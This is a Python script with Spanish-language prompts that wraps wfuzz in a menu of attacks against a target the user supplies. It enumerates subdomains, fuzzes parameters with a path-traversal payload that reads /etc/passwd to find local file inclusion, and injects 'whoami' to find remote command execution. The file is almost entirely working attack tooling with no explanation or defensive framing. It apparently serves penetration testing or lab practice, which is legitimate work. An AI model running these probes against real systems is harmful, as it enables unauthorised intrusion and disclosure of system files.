import subprocess as sp
import sys

print("""
[+] Herramienta WFuzz Automatica
""")

# Verificar que wfuzz esta instalado
try:
    sp.run(["wfuzz", "--version"], stdout=sp.DEVNULL, stderr=sp.DEVNULL, timeout=3)
except FileNotFoundError:
    print("[!] Error: wfuzz no esta instalado")
    print("    Instala con: sudo apt install wfuzz")
    sys.exit(1)

try:
    opcion = int(input("""
Digite una opcion

[1] Escaneo de subdominios
[2] Busqueda de vulnerabilidad LFI
[3] Busqueda de vulnerabilidad RCE
[4] Salir

> """))
except ValueError:
    print("Error: Ingresa un numero valido")
    exit()

if opcion == 1:
    try:
        dominio = input("Digite el dominio objetivo (ej: site.com): ").strip()
        comando = [
            "wfuzz",
            "-c",
            "-w", "/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt",
            "--hc", "404",
            f"http://FUZZ.{dominio}/"
        ]
        sp.run(comando)
    except Exception as e:
        print("Error:", e)
        exit()

elif opcion == 2:
    try:
        url = input("URL base (ej: http://172.17.0.2/index.php): ").strip()
        comando = [
            "wfuzz",
            "-c",
            "-w", "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
            f"{url}?FUZZ=../../../../../../../../../../../../../etc/passwd"
        ]
        sp.run(comando)
    except Exception as e:
        print("Error:", e)
        exit()

elif opcion == 3:
    try:
        url = input("Digite la URL objetivo (ej: http://site.com): ").strip()
        comando = [
            "wfuzz",
            "-c",
            "-w", "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
            f"{url}?FUZZ=whoami"
        ]
        sp.run(comando)
    except Exception as e:
        print("Error:", e)
        exit()

elif opcion == 4:
    print("Adios...")
    exit()

else:
    print("Opcion no valida")
    exit()
